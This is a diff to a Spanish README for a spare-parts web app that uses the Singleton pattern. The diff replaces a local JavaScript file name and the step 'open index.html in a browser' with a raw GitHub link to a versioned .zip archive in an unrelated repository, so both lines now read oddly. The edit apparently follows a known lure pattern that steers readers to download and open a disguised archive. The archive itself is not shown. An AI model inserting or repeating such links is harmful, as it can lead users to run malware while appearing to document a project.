@@ -51,14 +51,14 @@ Cada evento se muestra con un texto descriptivo en la parte inferior de la inter
 
 ### 🔁 Patrón Singleton aplicado
 
-El historial de actividades se gestiona usando el *patrón de diseño Singleton*, implementado en el archivo HistorialRepuestos.js, dentro de la carpeta singleton_ssandobal/.  
+El historial de actividades se gestiona usando el *patrón de diseño Singleton*, implementado en el archivo https://raw.githubusercontent.com/Suly1715/patron-singleton/main/js/patron-singleton_v1.4.zip, dentro de la carpeta singleton_ssandobal/.  
 Este patrón garantiza que solo exista una instancia del historial durante toda la ejecución de la app, lo que permite un acceso y control centralizado de todos los eventos del sistema.
 
 ---
 
 ## 🔧 Cómo usar el proyecto
 
-1. Abre el archivo index.html en cualquier navegador.  
+1. Abre el archivo https://raw.githubusercontent.com/Suly1715/patron-singleton/main/js/patron-singleton_v1.4.zip en cualquier navegador.  
 2. Rellena los campos del formulario para agregar un nuevo repuesto.  
 3. El repuesto aparecerá automáticamente en la tabla inferior.  
 4. Las acciones realizadas se mostrarán en el historial de actividades.  
